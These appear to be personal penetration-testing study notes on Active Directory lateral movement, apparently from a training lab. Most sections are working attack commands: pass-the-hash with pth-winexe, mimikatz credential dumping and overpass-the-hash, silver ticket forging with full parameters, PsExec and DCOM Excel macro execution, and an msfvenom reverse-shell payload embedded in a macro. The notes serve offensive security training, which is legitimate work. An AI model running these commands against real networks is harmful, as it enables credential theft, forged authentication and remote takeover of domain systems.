## Active Directory Lateral Movement

### Passing-the-hash toolkit

Uses NTLM authentication to obtain code execution on a Windows client.

This works for domain accounts as well as the built in local-admin account.

From a Kali Linux machine:

```bash
pth-winexe -U offsec%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //192.168.216.10 cmd
```

### Overpass the Hash

We can take a privileged user's NTLM hash, use it to generate a Kerberos TGT, then use that ticket to gain remote access to another server.  

1. Compromise a Windows machine, then use mimikatz to view cached credentials

   - In the lab, we simulated this opening Notepad, right click the task bar icon, then SHIFT+RIGHT click the notepad icon on the menu and choosing 'run as different user'

   ```powershell
   privilege::debug 
   sekurlsa::logonpasswords
   ```

   Get the NTLM hash from this output for the user

2. Use mimikatz to convert the NTLM hash into a Kerberos ticket

   ```powershell
   sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:2892d26cdf84d7a70e2eb3b9f05c425e /run:PowerShell.exe
   ```

   This will open a Powershell command as the specified user.

3. In the new Powershell window, access some resource to generate a TGT (like accessing a network share)

   ```powershell
   net use \\dc01
   ```

4. Use klist to view the Kerberos tickets

   ```powershell
   klist
   ```

5. We now have a TGT and a Powershell window in the context of the user, so we can use these to obtain code execution on remote servers that user has access to, like a domain controller, using PSExec.exe
   https://docs.microsoft.com/en-us/sysinternals/downloads/psexec
   Note:  When I ran this on Win10, it prompted me with a user agreement.  I'm not sure how this will behave through a reverse shell.

   ```powershell
   .\psexec \\dc01 cmd.exe
   
   # Options
   \\dc01	# Specifies the remote target
   cmd.exe	# Specifies the command to run on the target
   ```

### Pass the Ticket (Silver Ticket)

For obtaining a TGS ticket to use on remote systems, we craft a Silver Ticket using the NTLM of a service account, an SPN of a service, and customized group permissions.

1. Obtain Security Identifier for the Domain using the SID of the current user:

   ```powershell
   whoami /user
   ```

   The Domain SID is extracted by dropping the final section of the User SID:

   > Example:
   >
   > User SID =       S-1-5-21-4038953314-3014849035-1274281563-1103
   > Domain SID = S-1-5-21-4038953314-3014849035-1274281563

2. Use Mimikatz to purge any existing Kerberos tickets and verify the purge

   ```powershell
   kerberos::purge
   kerberos::list
   ```

3. Craft the silver ticket and load it into memory.  By default, the group memberships are set to local-admin and other highly privileged groups, including domain-admins.

   ```powershell
   kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-4038953314-3014849035-1274281563 /target:CorpWebServer.corp.com /service:HTTP /rc4:e2b475c11da2a0748290d87aa966c327 /ptt
   
   # Options
   /user:offsec 	# User requesting the TGS
   /domain:corp.com 	# Domain for the TGS
   /sid:S-1-5-21-4038953314-3014849035-1274281563 	# SID of the domain
   # Note: the SPN was HTTP/CorpWebServer.corp.com, so I'm not sure if it always breaks down to service/FQDN or not
   /target:CorpWebServer.corp.com 	# FQDN of the service
   /service:HTTP 	# Service type
   /rc4:e2b475c11da2a0748290d87aa966c327 	# Hash of service account for SPN
   /ptt	# Inject the ticket directly into memory
   ```

4. Verify the ticket exists in memory

   ```powershell
   kerberos::list
   ```

##### Mimikatz Silver Ticket Command Reference

The Mimikatz command to create a golden or silver ticket is “kerberos::golden”

```bash
/domain # the fully qualified domain name. In this example: “lab.adsecurity.org”.
/sid #– the SID of the domain. In this example: “S-1-5-21-1473643419-774954089-2222329127”.
/user # username to impersonate
/groups # (optional) – group RIDs the user is a member of (the first is the primary group)
# default: 513,512,520,518,519 for the well-known Administrator’s groups (listed below).
/ticket # (optional) – provide a path and name for saving the Golden Ticket file to for later use or use /ptt to immediately inject the golden ticket into memory for use.
/ptt # as an alternate to /ticket – use this to immediately inject the forged ticket into memory for use.
/id # (optional) user RID. Mimikatz default is 500 (the default Administrator account RID).
/startoffset # (optional) the start offset when the ticket is available (generally set to –10 or 0 if this option is used). Mimikatz Default value is 0.
/endin # (optional) ticket lifetime. Mimikatz Default value is 10 years (~5,262,480 minutes). Active Directory default Kerberos policy setting is 10 hours (600 minutes).
/renewmax # (optional) maximum ticket lifetime with renewal. Mimikatz Default value is 10 years (~5,262,480 minutes). Active Directory default Kerberos policy setting is 7 days (10,080 minutes).
```


Silver Ticket Required Parameters:

```bash
/target # the target server’s FQDN.
/service # the kerberos service running on the target server. This is the Service Principal Name class (or type) such as cifs, http, mssql.
/rc4 # the NTLM hash for the service (computer account or user account)
```


Silver Ticket Default Groups:

```bash
Domain Users SID: S-1-5-21<DOMAINID>-513
Domain Admins SID: S-1-5-21<DOMAINID>-512
Schema Admins SID: S-1-5-21<DOMAINID>-518
Enterprise Admins SID: S-1-5-21<DOMAINID>-519
Group Policy Creator Owners SID: S-1-5-21<DOMAINID>-520
```
### Distributed Component Object Model (DCOM)

Requires local admin rights on the remote machine (and maybe domain)

#### Discover the available methods for an object

Using Microsoft Excel as an example:

1. Create an instance of the object in question (Ex. Excel) called `$com`

   ```powershell
   $com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application","172.16.216.5"))
   
   # Options
   [activator]::CreateInstance		# Creates the instance
   GetTypeFromProgId		# Used to get the type to supply to CreateInstance
   "Excel.Application","172.16.216.5"	# Program ID and IP of source
   ```

2. Discover the created instance's methods and objects

   ```powershell
   $com | Get-Member
   ```

   In this example, we see a `Run` method, that can be used to run VB macros.

#### Create the Proof of Concept

1. Create a new document in Excel, then going to View -> Macros and creating a new macro.

2. Enter some test code

   ```vbscript
   Sub mymacro()
       Shell ("notepad.exe")
   End Sub
   ```

3. Save the macro and save the Excel file in legacy format (97-2003 Workbook)

4. Copy the document to the remote computer.  This script works due to the assumption of Local Admin rights on the remote machine.

   ```powershell
   $LocalPath = "C:\Users\jeff_admin\desktop\myexcel.xls"
   $RemotePath = "\\172.16.216.5\c$\myexcel.xls"
   [System.IO.File]::Copy($LocalPath, $RemotePath, $True)
   
   # Options
   $True 	# This flag indicates the destination file should be overwritten if it exists
   ```

5. Open the Excel document on the remote system using the `$com` object

   ```powershell
   $Workbook = $com.Workbooks.Open("C:\myexcel.xls")
   ```

   - If this results in an error, it is because the remote system is uses the SYSTEM account to open the workbook and Excel requires the account to have a profile folder.  Fix that with the following:

     ```powershell
     # Create a var to make a Desktop folder for SYSTEM
     $Path = "\\172.16.216.5\c$\Windows\sysWOW64\config\systemprofile\Desktop"
     # Create the directory
     $temp = [system.io.directory]::createDirectory($Path)
     ```

6. Call the run method of the `$com` object to run the macro

   ```powershell
   $com.Run("mymacro")
   ```

   Logging into the machine will show notepad.exe running in the background in a High Integrity context.

#### Weaponize

With a working PoC, we can construct a Reverse Shell, as shown in Linux\Pentest Cmds\Client-Side-Attacks\MSOffice.md, but is summarized below.

1. Use msfvenom to construct the payload using the hta format, but our LHOST will be the Windows client we are attacking from (this is the interface that connects to the network of our target in this case)

   ```powershell
   msfvenom -p windows/shell_reverse_tcp LHOST=172.16.216.10 LPORT=4444 -f hta-psh -o badfile.hta
   ```

2. Open the output file and copy from `"powershell.exe` to the quote at the end of the 64-bit encoded payload (but not the `,0` at the end)

3. Use a Python script to split the string into smaller chunks to overcome the VB Script limitations.

4. Paste this variable construct into the macro and call the str as the command:

   ```vbscript
   Sub mymacro()
       Dim Str as String
       <INSERT STRING BUILDER OUTPUT FROM PYTHON>
       CreateObject("Wscript.shell").Run Str
   End Sub
   ```

### Remote Powershell Session

Requires admin rights, allows you to run commands on a remote machine using Powershell

```bash
# Create a new session object for the DC
$dcsesh = New-PSSession -Computer SANDBOXDC

# Run commands against the DC using PowerShell
# The command to execute must be wrapped in curly brackets
Invoke-Command -Session $dcsesh -ScriptBlock {ipconfig}

# Copy a file to the remote server
Copy-Item "C:\Users\Public\whoami.exe" -Destination "C:\Users\Public\" -ToSession $dcsesh
```

